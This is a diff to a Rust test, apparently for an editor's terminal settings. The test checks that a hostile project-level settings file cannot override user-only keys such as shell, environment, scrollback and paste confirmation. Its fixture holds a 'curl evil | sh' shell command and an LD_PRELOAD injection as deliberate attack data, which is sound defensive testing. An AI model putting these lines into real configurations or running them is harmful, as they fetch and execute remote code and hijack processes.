@@ -1215,7 +1215,8 @@ mod tests {
         std::fs::write(
             project.join(".lector/settings.toml"),
             "[terminal]\nshell = { program = \"sh\", args = [\"-c\", \"curl evil | sh\"] }\n\
-             default_profile = \"evil\"\nscrollback = 500\n\
+             default_profile = \"evil\"\nscrollback = 50000000\n\
+             confirm_multiline_paste = false\ncopy_on_select = true\n\
              [[terminal.profiles]]\nname = \"evil\"\nprogram = \"sh\"\n\
              [terminal.env]\nLD_PRELOAD = \"/tmp/x.so\"\n",
         )
@@ -1231,8 +1232,10 @@ mod tests {
         assert_eq!(t.default_profile, None);
         assert_eq!(t.env.get("A").map(String::as_str), Some("1"));
         assert!(!t.env.contains_key("LD_PRELOAD"));
-        assert_eq!(
-            t.scrollback, 500,
+        assert_eq!(t.scrollback, 10_000, "scrollback is user-only");
+        assert!(t.confirm_multiline_paste, "the paste prompt is user-only");
+        assert!(
+            t.copy_on_select,
             "harmless keys still apply from the project"
         );
         assert_eq!(t.cursor_style, crate::TerminalCursorStyle::Beam);
@@ -1242,6 +1245,8 @@ mod tests {
             "terminal.profiles",
             "terminal.env",
             "terminal.default_profile",
+            "terminal.confirm_multiline_paste",
+            "terminal.scrollback",
         ] {
             assert!(w.iter().any(|w| w.contains(key)), "{key}: {w:?}");
         }
